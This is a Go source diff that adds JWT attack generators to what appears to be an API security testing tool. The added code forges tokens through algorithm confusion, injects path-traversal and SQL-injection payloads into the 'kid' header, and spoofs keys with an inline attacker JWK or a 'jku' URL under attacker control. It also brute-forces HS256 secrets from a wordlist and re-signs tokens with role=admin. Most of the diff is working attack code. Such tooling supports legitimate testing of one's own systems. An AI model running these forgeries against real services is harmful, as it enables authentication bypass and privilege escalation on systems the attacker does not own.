@@ -1,9 +1,13 @@
 package mutate
 
 import (
+	"crypto/hmac"
+	"crypto/sha256"
+	"encoding/json"
 	"fmt"
 	"net/http"
 	"sort"
+	"strings"
 
 	jwthelper "github.com/bugsyhewitt/possession/internal/jwt"
 	"github.com/bugsyhewitt/possession/internal/model"
@@ -319,6 +323,218 @@ func (JWTResignWeakKey) Generate(base *model.CapturedRequest, _ *model.RoleMatri
 	}
 	return out
 }
+
+// ─── jwt-alg-confusion ────────────────────────────────────────────────
+
+// JWTAlgConfusion implements the RS256/ES256→HS256 algorithm confusion
+// attack: re-sign the token using the server's public key as the HMAC
+// secret. Requires matrix.Target.JWT.PublicKeyPEM; skips with a note
+// when absent.
+type JWTAlgConfusion struct{}
+
+func (JWTAlgConfusion) Name() string { return "jwt-alg-confusion" }
+
+func (JWTAlgConfusion) Generate(base *model.CapturedRequest, m *model.RoleMatrix) []model.Variant {
+	locs := jwthelper.Detect(base)
+	if len(locs) == 0 {
+		return nil
+	}
+	if m == nil || m.Target.JWT == nil || m.Target.JWT.PublicKeyPEM == "" {
+		return nil // requires public_key_pem; skip silently (caller notes via plan)
+	}
+	out := make([]model.Variant, 0, len(locs))
+	for _, loc := range locs {
+		tok, err := jwthelper.AlgConfusionFromPEM(loc.Header, loc.Claims, m.Target.JWT.PublicKeyPEM)
+		if err != nil {
+			continue
+		}
+		req := replaceToken(base, loc, tok)
+		if req == nil {
+			continue
+		}
+		out = append(out, makeJWTVariant(req, loc, "jwt-alg-confusion",
+			"re-sign RS256/ES256 token with public key as HMAC secret",
+			"authn-bypass",
+			map[string]string{"attack": "alg-confusion"}))
+	}
+	return out
+}
+
+// ─── jwt-kid-injection ────────────────────────────────────────────────
+
+// JWTKidInjection manipulates the `kid` header to inject path-traversal
+// and SQL-injection payloads. Emits one variant per payload class.
+type JWTKidInjection struct{}
+
+func (JWTKidInjection) Name() string { return "jwt-kid-injection" }
+
+func (JWTKidInjection) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
+	locs := jwthelper.Detect(base)
+	if len(locs) == 0 {
+		return nil
+	}
+	out := make([]model.Variant, 0)
+	for _, loc := range locs {
+		for _, payload := range KidInjectionPayloads {
+			hdr := copyHeader(loc.Header)
+			hdr["kid"] = payload.Value
+			tok, err := jwthelper.Encode(hdr, loc.Claims, "")
+			if err != nil {
+				continue
+			}
+			req := replaceToken(base, loc, tok)
+			if req == nil {
+				continue
+			}
+			out = append(out, makeJWTVariant(req, loc, "jwt-kid-injection",
+				fmt.Sprintf("inject kid payload: %s", payload.Class),
+				"authn-bypass",
+				map[string]string{
+					"kid_class":   payload.Class,
+					"kid_payload": payload.Value,
+				}))
+		}
+	}
+	return out
+}
+
+// ─── jwt-jwks-spoof ───────────────────────────────────────────────────
+
+// JWTJwksSpoof embeds an attacker-controlled key in the JWT header — via
+// inline `jwk` or `jku` (URL) — and signs the token with the matching
+// private key. Tests whether the server trusts header-supplied keys.
+type JWTJwksSpoof struct{}
+
+func (JWTJwksSpoof) Name() string { return "jwt-jwks-spoof" }
+
+func (JWTJwksSpoof) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
+	locs := jwthelper.Detect(base)
+	if len(locs) == 0 {
+		return nil
+	}
+	// Generate an ephemeral attacker RSA key pair once per call.
+	privKey, pubKey, err := jwthelper.GenerateAttackerKeyPair()
+	if err != nil {
+		return nil
+	}
+	attackerKID := "attacker-key-1"
+	jwkMap := jwthelper.PublicKeyToJWK(pubKey, attackerKID)
+
+	out := make([]model.Variant, 0, len(locs)*2)
+	for _, loc := range locs {
+		// Variant 1: inline jwk header.
+		hdrJWK := copyHeader(loc.Header)
+		hdrJWK["alg"] = "RS256"
+		hdrJWK["kid"] = attackerKID
+		hdrJWK["jwk"] = jwkMap
+		delete(hdrJWK, "jku")
+		tokJWK, err := jwthelper.EncodeWithRS256(hdrJWK, loc.Claims, privKey)
+		if err == nil {
+			if req := replaceToken(base, loc, tokJWK); req != nil {
+				out = append(out, makeJWTVariant(req, loc, "jwt-jwks-spoof",
+					"embed attacker JWK inline in header",
+					"authn-bypass",
+					map[string]string{"spoof_type": "inline-jwk"}))
+			}
+		}
+
+		// Variant 2: jku pointing to an attacker-controlled URL (placeholder).
+		hdrJKU := copyHeader(loc.Header)
+		hdrJKU["alg"] = "RS256"
+		hdrJKU["kid"] = attackerKID
+		hdrJKU["jku"] = JWKSAttackerURL
+		delete(hdrJKU, "jwk")
+		tokJKU, err := jwthelper.EncodeWithRS256(hdrJKU, loc.Claims, privKey)
+		if err == nil {
+			if req := replaceToken(base, loc, tokJKU); req != nil {
+				out = append(out, makeJWTVariant(req, loc, "jwt-jwks-spoof",
+					"set jku to attacker-controlled URL",
+					"authn-bypass",
+					map[string]string{
+						"spoof_type":    "jku-redirect",
+						"attacker_jku":  JWKSAttackerURL,
+					}))
+			}
+		}
+	}
+	return out
+}
+
+// ─── jwt-hmac-crack ───────────────────────────────────────────────────
+
+// JWTHmacCrack attempts to recover an HS256 secret from the wordlist.
+// On a hit, re-signs a tampered token (admin role escalation) with the
+// cracked secret. Cap: at most HmacCrackMaxAttempts per token location.
+type JWTHmacCrack struct {
+	// Wordlist overrides the default when non-nil (primarily for tests).
+	Wordlist []string
+}
+
+func (JWTHmacCrack) Name() string { return "jwt-hmac-crack" }
+
+func (j JWTHmacCrack) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
+	locs := jwthelper.Detect(base)
+	if len(locs) == 0 {
+		return nil
+	}
+	wordlist := j.Wordlist
+	if wordlist == nil {
+		wordlist = HmacCrackWordlist
+	}
+	out := make([]model.Variant, 0)
+	for _, loc := range locs {
+		// Only crack HS256 tokens (RS256 etc. can't be cracked this way).
+		alg, _ := loc.Header["alg"].(string)
+		if !strings.EqualFold(alg, "HS256") {
+			continue
+		}
+		parts := strings.SplitN(loc.Raw, ".", 3)
+		if len(parts) != 3 {
+			continue
+		}
+		encodedHeaderClaims := parts[0] + "." + parts[1]
+		attempts := 0
+		for _, secret := range wordlist {
+			if attempts >= HmacCrackMaxAttempts {
+				break
+			}
+			attempts++
+			h := hmac.New(sha256.New, []byte(secret))
+			h.Write([]byte(encodedHeaderClaims))
+			expectedSig := jwthelper.B64URL(h.Sum(nil))
+			if expectedSig != parts[2] {
+				continue
+			}
+			// Secret found — emit a tampered token re-signed with it.
+			tamperedClaims := copyClaims(loc.Claims)
+			if tamperedClaims == nil {
+				tamperedClaims = map[string]any{}
+			}
+			tamperedClaims["role"] = "admin"
+			tok, err := jwthelper.EncodeWithHS256(copyHeader(loc.Header), tamperedClaims, secret)
+			if err != nil {
+				break
+			}
+			req := replaceToken(base, loc, tok)
+			if req == nil {
+				break
+			}
+			out = append(out, makeJWTVariant(req, loc, "jwt-hmac-crack",
+				fmt.Sprintf("cracked HS256 secret %q, re-signed with role=admin", secret),
+				"privesc",
+				map[string]string{
+					"cracked_secret": secret,
+					"tampered_claim": "role=admin",
+				}))
+			break // one cracked variant per location
+		}
+	}
+	return out
+}
+
+// jwkToJSON is used to embed the attacker JWK map as a JSON value in the header.
+// golang-jwt serialises map[string]any as a nested JSON object; we want the same.
+var _ = json.Marshal // ensure import is used
 
 // ─── helpers ──────────────────────────────────────────────────────────
 
